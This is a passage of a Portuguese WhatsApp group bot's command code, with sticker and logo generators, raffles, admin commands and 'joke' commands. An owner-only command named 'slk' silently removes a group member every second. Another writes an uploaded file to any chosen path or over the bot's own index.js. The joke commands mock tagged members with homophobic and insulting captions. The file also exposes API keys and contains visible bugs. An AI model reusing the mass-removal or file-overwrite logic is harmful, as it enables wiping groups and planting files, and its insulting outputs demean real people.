                   conn.sendMessage(from, {image: buffer} ,{quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break 
case 'plaquinha7':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images.jpeg?text.0.text=${teks}&text.0.position.x=-10%25&text.0.position.y=-35%25&text.0.size=44&text.0.color=000000&text.0.opacity=64" width="168" height="300" alt="" />`)
                   conn.sendMessage(from, {image: buffer} ,{quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break

case 'plaquinha8':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(1).jpeg?text.0.text=${teks}&text.0.position.x=-36%25&text.0.position.y=-16%25&text.0.size=39" width="229" height="220" alt="" />`)
                   conn.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break  
case 'plaquinha9':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(2).jpeg?text.0.text=${teks}&text.0.position.x=-15%25&text.0.position.y=-49%25&text.0.size=41&text.0.color=000000&text.0.font.family=PT%20Sans%20Narrow&text.0.font.weight=300" width="194" height="259" alt="" />`)
                   conn.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break
case 'plaquinha10':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(11).jpeg?text.0.text=${teks}&text.0.position.x=-13%25&text.0.position.y=-56%25&text.0.size=51&text.0.color=000000&text.0.opacity=89&text.0.font.family=Philosopher&text.0.outline.opacity=15" width="151" height="335" alt="" />`)
                   conn.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break  
case 'plaquinha11':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 12) return reply('O texto é longo, até 10> caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images.jpeg?text.0.text=${teks}&text.0.position.x=-12%25&text.0.position.y=-61%25&text.0.size=41&text.0.color=000000&text.0.opacity=57&text.0.font.family=Russo%20One" width="447" height="686" alt="" />`)
                   connr.sendMessage(from, {image: buffer}, {quoted: selo}),
                   reply('plaquinha enviada no seu pv')
					break
//=======================================\\


// LOGOS 
case 'marvel': case 'pornhub': case 'space': case 'stone': case 'steel': case 'grafity': case 'glitch3': case 'america':
try {
var [DG, DG2] = q.split("|")
if(!q.includes("|")) return reply(`Exemplo: ${prefix+command} bot|luix`)
reply(enviar.espere);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/logos_2?texto=${DG}&texto2=${DG2}&category=${command}&apikey=@Luix1397`);
conn.sendMessage(from, {image: {url: ABC.resultado}}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break

case 'angelwing':  case 'hackneon': case 'fpsmascote': 
case 'equipemascote': case 'txtquadrinhos': case 'ffavatar':
case 'mascotegame': case 'angelglx': case 'gizquadro': 
case 'wingeffect': case 'blackpink': case 'metalgold':
case 'girlmascote': case 'logogame':
try {
if(!q) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply(enviar.espere);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/logos_EPH?texto=${q}&category=${command}&apikey=@Luix1397`);
conn.sendMessage(from, {image: {url: ABC.resultado}}, {quoted: info}).catch(() => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break
case 'shadow': case 'metalgold': case 'cup': case 'txtborboleta':
case 'cemiterio': case 'efeitoneon': case 'harryp':
case 'lobometal': case 'neon2': case 'madeira': case 'lovemsg3':
case 'coffecup': case 'coffecup2': case 'florwooden':
case 'narutologo': case 'fire': case 'romantic': case 'smoke':  
case 'papel': case 'lovemsg': case 'lovemsg2':
try {
if(!q) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply(enviar.espere);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/logos_PHT?texto=${q}&category=${command}&apikey=@Luix1397`);
conn.sendMessage(from, {image: {url: ABC.resultado}}, {quoted: info}).catch(() => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break
case 'fiction': case '3dstone': case 'areia': case 'style': 
case 'blood': case 'pink': case 'cattxt': case 'neondevil':
case 'carbon': case 'metalfire': case 'thunder': case 'vidro': 
case 'jokerlogo': case 'transformer': case 'demonfire':
case 'jeans': case 'metalblue': case 'natal': case 'ossos':
case 'asfalto': case 'break': case 'glitch2': case 'colaq':
case 'neon3': case 'nuvem': case 'horror': case 'matrix':
case 'berry': case 'luxury': case 'lava': case 'thunderv2':
case 'neongreen': case 'neve': case 'neon': case 'neon1':  
case 'neon3d': case 'gelo': case 'neon3': case '3dgold':
case 'lapis': case 'toxic': case 'demongreen': case 'rainbow':
case 'halloween':
try {
if(!q) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply(enviar.espere);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/logos?texto=${q}&category=${command}&apikey=@Luix1397`);
conn.sendMessage(from, {image: {url: ABC.resultado}}, {quoted: info}).catch(() => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break

//========(SORTEIO-VOTAR-CASES)=========\\

case 'delvote':
case 'delvoto':  
if(!info.key.remoteJid) return
delVote(from)
reply('votação deletada com sucesso')
break

case 'votar':
case 'votacao': 
case 'votação': 
if(!isGroup) return reply(enviar.msg.grupo)
if(!budy.includes("/")) return reply(`Cade a /, exemplo ${prefix}votação @marca/Ele é total gay/ 1`)
if(!q) return reply('*Votação*\n\n'+ prefix+ 'votar @tag marcar / pergunta  / 1 (1 = 1 Minuto)')
if (info.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || info.message.extendedTextMessage.contextInfo == null) {
let id = info.message.extendedTextMessage.contextInfo.mentionedJid[0]
split = args.join(' ').replace('@', '').split('/')
if(!Number(split[2])) return reply('cade os minutos eim?\n\n1 = 1 Minuto')
await mentions('Vote ' +'@'+ id.split('@')[0]+' para' +'\n\n' + `voto = ✅\ndevoto = ❌\n\npergunta: ${split[1]}`,[id],true)
addVote(from,split[1],split[0],split[2],reply)
}
break

case 'infosorteio':
case 'helpsorteio':  
await conn.sendMessage(from, {text:  infosorteio(prefix, pushname)}, {quoted: selo})
break

case 'substituir':
if(!SoDono && !isnit) return reply("Só dono..")
 if (isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(q, doc)
conn.sendMessage(from, {text:'Substituido com sucesso..'},{quoted: info})
} else {
reply('nao deu')
}
break

case 'index-bot':
if(!SoDono)return reply('Só meu dono')
if (isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync('./index.js', doc)
conn.sendMessage(from, {text:'Pronto novinha..'},{quoted: info})
} else {
reply('nao deu')
}
break

case 'promover': 
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/promover.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja promover ele pra administrador ou marque com ${prefix}promover @marcar-ele`)
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]} Foi promovido(a) para adm com sucesso.`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "promote")  
} else {
if(q.length > 15) return reply('Só pode promover uma pessoa por vez..')
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi promovido(a) para [ ADMINISTRADOR ] com sucesso.`, mentions: [menc_jid]})
conn.groupParticipantsUpdate(from, [menc_jid], "promote")
}
break

case 'rebaixar': 
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja promover ele pra administrador ou marque com ${prefix}promover @marcar-ele`)
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]}  Foi Rebaixado para [ MEMBRO COMUM ] com sucesso.`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "demote")  
} else {
if(q.length > 15) return reply('Só pode rebaixar uma pessoa por vez..')
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi Rebaixado para [ MEMBRO COMUM ] com sucesso.`, mentions: [menc_jid]})
conn.groupParticipantsUpdate(from, [menc_jid], "demote")
}
break

case 'sorteio':
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')
try{
if(!isGroup) return reply(enviar.msg.grupo)
if(!q) return reply(`Coloque algo, após o comando sorteio, por exemplo, ${prefix}sorteio de 100 R$`)
d = []
teks = `🎉Parabéns, por ganhar o sorteio ${q}:\n\n`
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🔥፝⃟  ➣ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'slk77': case 'slk':
if(!SoDono && !isnit) return reply("Só dono pode utilizar este comando...")
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta função.')
if(info.key.fromMe) return 
function banirtodos() {
var r_banirtodos = Math.floor(Math.random() * groupMembers.length + 0)
nmrbot = botNumber.split("@")[0]
var resp = `${groupMembers[r_banirtodos].id.split("@")[0]}`
if(resp === setting.numerodono || resp === nmrbot) {
return
} else {
conn.groupParticipantsUpdate(from, [resp + "@s.whatsapp.net"], 'remove')
}
}
myinterval = setInterval(banirtodos, 1000)
if(groupMembers.length <= 2) {
clearInterval(myinterval);
}
break
case 'sorteionumero':
case 'sorteionumeros':  
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')  
try{
if(!isGroup) return reply(enviar.msg.grupo)
if(!q) return reply(`Coloque algo, após o comando sorteio, por exemplo, ${prefix}sorteionumero de 100 R$`)
var numerossrt = sortear[Math.floor(Math.random() * sortear.length)] 
d = []
teks =  `🎉Parabéns ao número do sortudo, por ganhar o sorteio ${q}:\n\n`
for(i = 0; i < 1; i++) {
teks += `🔥፝⃟  ➣ ${numerossrt}\n`
d.push(numerossrt)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
//======================================\\



//==========(TTPS/ATTP/TTM)============\\
case 'ttp':
try {
reply(enviar.espere)
string = args.join(' ') || 'Texto indefinido'
post = `https://tohka.tech/api/maker/ttp?texto=${q}&cor=ffea00&apikey=dRDpLxcywr`
sendStickerFromUrl(from, post, {quoted: info})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'attp':		
try {
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp Sad`)
reply(enviar.espere)
await conn.sendMessage(from, {sticker: {url:`https://api.brizaloka-api.tk/ttp/${command}1?apikey=brizaloka&text=${encodeURI(q)}`}}, {quoted: info})
} catch {
reply('ERROR')
}
break	

case 'attp2':		
try {
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp Sad`)
reply(enviar.espere)
await conn.sendMessage(from, {sticker: {url:`https://api.brizaloka-api.tk/ttp/${command}?apikey=brizaloka&text=${encodeURI(q)}`}}, {quoted: info})
} catch {
reply('ERROR')
}
break	
case 'attp3':		
try {
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp Sad`)
reply(enviar.espere)
await conn.sendMessage(from, {sticker: {url:`https://api.brizaloka-api.tk/ttp/${command}?apikey=brizaloka&text=${encodeURI(q)}`}}, {quoted: info})
} catch {
reply('ERROR')
}
break	
case 'attp3':		
try {
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp Sad`)
reply(enviar.espere)
await conn.sendMessage(from, {sticker: {url:`https://api.brizaloka-api.tk/ttp/${command}?apikey=brizaloka&text=${encodeURI(q)}`}}, {quoted: info})
} catch {
reply('ERROR')
}

case 'attp4':		
try {
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp Sad`)
reply(enviar.espere)
await conn.sendMessage(from, {sticker: {url:`https://api.brizaloka-api.tk/ttp/${command}?apikey=brizaloka&text=${encodeURI(q)}`}}, {quoted: info})
} catch {
reply('ERROR')
}
break	
case 'attp5':		
try {
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp Sad`)
reply(enviar.espere)
await conn.sendMessage(from, {sticker: {url:`https://api.brizaloka-api.tk/ttp/${command}?apikey=brizaloka&text=${encodeURI(q)}`}}, {quoted: info})
} catch {
reply('ERROR')
}
break	
case 'attp6':		
try {
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp Sad`)
reply(enviar.espere)
await conn.sendMessage(from, {sticker: {url:`https://api.brizaloka-api.tk/ttp/${command}?apikey=brizaloka&text=${encodeURI(q)}`}}, {quoted: info})
} catch {
reply('ERROR')
}
break	
case 'attp7':  
case 'attp8':  
case 'attp9':  
case 'attp10':  
try {
if (q < 1) return reply(`_Coloque o texto_\n*Exemplo: ${prefix + command} luix`)
reply(enviar.espere)
url = await getBuffer(`https://apis.nezsab-apis.xyz/api/${command}?texto=${q}&apikey=apikey_LuixxLindo-2023`)
await conn.sendMessage(from, {sticker: url}, {quoted: info})
} catch {
reply('ERROR')
}
break	
//======================================\\


//===(ZOUEIRAS/BRINCADEIRAS/HUMOR)===\\

case 'modonsfw':
case 'nsfw':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isNsfw) return reply('O modo nsfw já está ativo')
nsfw.push(from)
fs.writeFileSync('./datab/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`✓Ativado com sucesso o modo nsfw +18 no grupo\`\`\` *${groupMetadata.subject}*`)
} else if (Number(args[0]) === 0) {
if (!isNsfw) return reply('O modo nsfw já está Desativado')  
nsfw.splice(from, 1)
fs.writeFileSync('./datab/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`✓Modo Nsfw +18 desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
reply('1 para ativar, 0 para desligar')
}
break 

case 'modobrincadeira':
case 'modobrincadeiras':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isModobn) return reply('o modobrincadeira já está ativo')
modobn.push(from)
fs.writeFileSync('./datab/grupos/brincadeiras.json', JSON.stringify(modobn))
reply('🎯 Ativou com sucesso o recurso de Modo brincadeira neste grupo 🪀')
} else if (Number(args[0]) === 0) {
if (!isModobn) return reply('o modobrincadeira já está Desativado')
pesquisar = from
processo = modobn.indexOf(pesquisar)
while(processo >= 0){
modobn.splice(processo, 1)
processo = modobn.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/brincadeiras.json', JSON.stringify(modobn))
reply('🎯 Desativou com sucesso o recurso de Modo brincadeira neste grupo 🪀')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'puxas':
case 'Puxadas':  
if(!SoDono) return reply("So Meu dono Lerdao")
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isPuxadas) return reply('as puxadas já está ativo')
modobn.push(from)
fs.writeFileSync('./datab/grupos/puxas.json', JSON.stringify(modobn))
reply('👻 Ativou com sucesso o recurso de Modo Puxadavip neste grupo 👻')
} else if (Number(args[0]) === 0) {
if (!isPuxadas) return reply('o modobrincadeira já está Desativado')
pesquisar = from
processo = modobn.indexOf(pesquisar)
while(processo >= 0){
modobn.splice(processo, 1)
processo = modobn.indexOf(pesquisar)
}
fs.writeFileSync('./datab/grupos/puxas.json', JSON.stringify(modobn))
reply('👻 Desativou com sucesso o recurso de Modo Puxada vip neste grupo 👻')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'gerarnicgbbck2': 
send = await fetchJson(`https://api.brizaloka-api.tk/gerador/fancytext?apikey=brizaloka&text=${q}`)
reply(` 🧙🏻‍♂️NICKS GERADOS COM SUCESSO!🧙🏻‍♂️
👾 ${send.random_1} 
👾 ${send.random_2} 
👾 ${send.random_3} 
👾 ${send.random_4} 
👾 ${send.random_5}
👾 ${send.squares}
👾 ${send.inverted_squares}
👾 ${send.italic}
👾 ${send.bold}
👾 ${send.future_alien}
👾 ${send.asian_1}
👾 ${send.asian_2}
👾 ${send.squiggle}
👾 ${send.squiggle_2}
👾 ${send.squiggle_3}
👾 ${send.squiggle_4}
👾 ${send.neon}
👾 ${send.random_1} 
👾 ${send.random_2} 
👾 ${send.random_3} 
👾 ${send.random_4} 
👾 ${send.random_5}
👾 ${send.squares}
👾 ${send.inverted_squares}
👾 ${send.italic}
👾 ${send.bold}
👾 ${send.future_alien}
👾 ${send.asian_1}
👾 ${send.asian_2}
👾 ${send.squiggle}
👾 ${send.squiggle_2}
👾 ${send.squiggle_3}
👾 ${send.squiggle_4}
👾 ${send.neon} 
➣    ▉║█▐▉▉▐▐▍█║▍▉▏▍▍
➣    ▉║█▐▉▉▐▐▍█║▍▉▏▍▍
`)
break
case 'gerarnick':
try {
if(isDoubleByte(q)) return reply("Não pode letras modificadas nem emoji..");
if(!q) return reply(`Escreveva um nome para eu enviar ele com letras modificadas, Exemplo: ${prefix+command} bronxys`);
ABC = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/gerar_nick?nick=${q}&apikey=@Luix1397`);
AB = `Lista com base no Nick informado, para encontrar melhor fonte para utilizar:\n\n`;
for ( i of ABC) {
AB += `${i}\n\n`;
}
reply(AB);
} catch (e) {
return reply("Erro..");
}
break

case 'chance':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)  
var avb = body.slice(7)
if (args.length < 1) return conn.sendMessage(from, {text: `Você precisa digitar da forma correta\nExemplo: ${prefix}chance do luuck ser gay`}, {quoted: info})
random = `${Math.floor(Math.random() * 100)}`
hasil = `A chance ${body.slice(8)}\n\né de... ${random}%`
await conn.sendMessage(from, {text: hasil, contextInfo: {mentionedJid: [sender]}}, {quoted: info})
break

case 'gay':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)

if(budy.includes("@")) {
var blamention_id = menc_jid
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

conn.sendMessage(from, {text: `❰ Pesquisando a sua ficha de gay : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
feio = random
boiola = random
if (boiola < 20 ) {var bo = 'hmm... você é hetero😔'} else if (boiola == 21 ) {var bo = '+/- boiola'} else if (boiola == 23 ) {var bo = '+/- boiola'} else if (boiola == 24 ) {var bo = '+/- boiola'} else if (boiola == 25 ) {var bo = '+/- boiola'} else if (boiola == 26 ) {var bo = '+/- boiola'} else if (boiola == 27 ) {var bo = '+/- boiola'} else if (boiola == 2 ) {var bo = '+/- boiola'} else if (boiola == 29 ) {var bo = '+/- boiola'} else if (boiola == 30 ) {var bo = '+/- boiola'} else if (boiola == 31 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 32 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 33 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 34 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 35 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 36 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 37 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 3 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 39 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 40 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 41 ) {var bo = 'você é né?😏'} else if (boiola == 42 ) {var bo = 'você é né?😏'} else if (boiola == 43 ) {var bo = 'você é né?😏'} else if (boiola == 44 ) {var bo = 'você é né?😏'} else if (boiola == 45 ) {var bo = 'você é né?😏'} else if (boiola == 46 ) {var bo = 'você é né?😏'} else if (boiola == 47 ) {var bo = 'você é né?😏'} else if (boiola == 4 ) {var bo = 'você é né?😏'} else if (boiola == 49 ) {var bo = 'você é né?😏'} else if (boiola == 50 ) {var bo = 'você é ou não?🧐'} else if (boiola > 51) {var bo = 'você é gay🙈'
}
await conn.sendMessage(from, {image: {url: imggay}, caption: `  O quanto você é gay? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gay 🏳️‍🌈\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: info})
}, 7000)
break

case 'feio':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if(budy.includes("@")) {
var blamention_id = menc_jid
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

conn.sendMessage(from, {text: `❰ Pesquisando a sua ficha de feio : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
feio = random
if (feio < 20 ) {var bo = 'É não é feio'} else if (feio == 21 ) {var bo = '+/- feio'} else if (feio == 23 ) {var bo = '+/- feio'} else if (feio == 24 ) {var bo = '+/- feio'} else if (feio == 25 ) {var bo = '+/- feio'} else if (feio == 26 ) {var bo = '+/- feio'} else if (feio == 27 ) {var bo = '+/- feio'} else if (feio == 2 ) {var bo = '+/- feio'} else if (feio == 29 ) {var bo = '+/- feio'} else if (feio == 30 ) {var bo = '+/- feio'} else if (feio == 31 ) {var bo = 'Ainda tá na média'} else if (feio == 32 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 33 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 34 ) {var bo = 'É fein, mas tem baum coração'} else if (feio == 35 ) {var bo = 'Tá na média, mas não deixa de ser feii'} else if (feio == 36 ) {var bo = 'Bonitin mas é feio com orgulho'} else if (feio == 37 ) {var bo = 'Feio e preguiçoso(a), vai se arrumar praga feia'} else if (feio == 3 ) {var bo = 'tenho '} else if (feio == 39 ) {var bo = 'Feio, mas um banho E se arrumar, deve resolver'} else if (feio == 40 ) {var bo = 'FeiN,  mas não existe gente feia, existe gente que não conhece os produtos jequity'} else if (feio == 41 ) {var bo = 'você é Feio, mas é legal, continue assim'} else if (feio == 42 ) {var bo = 'Nada que uma maquiagem e se arrumar, que não resolva 🥴'} else if (feio == 43 ) {var bo = 'Feio que dói de ver, compra uma máscara que melhora'} else if (feio == 44 ) {var bo = 'Feio mas nada que um saco na cabeça não resolva né!?'} else if (feio == 45 ) {var bo = 'você é feio, mas tem bom gosto'} else if (feio == 46 ) {var bo = 'Feio mas tem muitos amigos'} else if (feio == 47 ) {var bo = 'Feio mas tem lábia pra pegar várias novinha'} else if (feio == 4 ) {var bo = 'Feio e ainda não sabe se vestir, vixi'} else if (feio == 49 ) {var bo = 'Feiooo'} else if (feio == 50 ) {var bo = 'você é Feio, mas não se encherga 🧐'} else if (feio > 51) {var bo = 'você é Feio demais 🙈'} 

await conn.sendMessage(from, {image: {url: imgfeio}, caption: `  O quanto você é feio? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ feio 🙉\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: info})
}, 7000)
break 

case 'matar':
case 'mata':  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('marque o alvo que você quer matar')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de matar o(a) @${mentioned[0].split('@')[0]} 😈👹` 
await conn.sendMessage(from, {video: {url: matarcmd}, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break 

case 'corno':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if(budy.includes("@")) {
var blamention_id = menc_jid
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
conn.sendMessage(from, {text:` ❰ Pesquisando a ficha de corno : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await conn.sendMessage(from, {image: {url: imgcorno}, caption: ` O quanto você é corno? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  corno 🐃`, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break

case 'vesgo':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if(budy.includes("@")) {
var blamention_id = menc_jid
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
conn.sendMessage(from, {text:`❰ Pesquisando a ficha de vesgo : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await conn.sendMessage(from, {image: {url: imgvesgo}, caption: `O quanto você é vesgo? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  Vesgo 🙄😆`, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break 

case 'bebado':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if(budy.includes("@")) {
var blamention_id = menc_jid
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
conn.sendMessage(from, {text:`❰ Pesquisando a ficha de bebado : @${blamention_id.split("@")[0]} , aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await conn.sendMessage(from, {image: {url: imgbebado}, caption:`O quanto você é bebado? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ Bêbado 🤢🥵🥴`, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break 

case 'gado':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if(budy.includes("@")) {
var blamention_id = menc_jid
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
conn.sendMessage(from, {text:`❰ Pesquisando a ficha de gado : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await conn.sendMessage(from, {image: {url: imggado}, caption: `O quanto você é gado? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  gado 🐂`, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break 

case 'gostoso':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(!isModobn) return reply(`Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite ${prefix}modobrincadeira 1`)
if(budy.includes("@")) {
var blamention_id = menc_jid
}

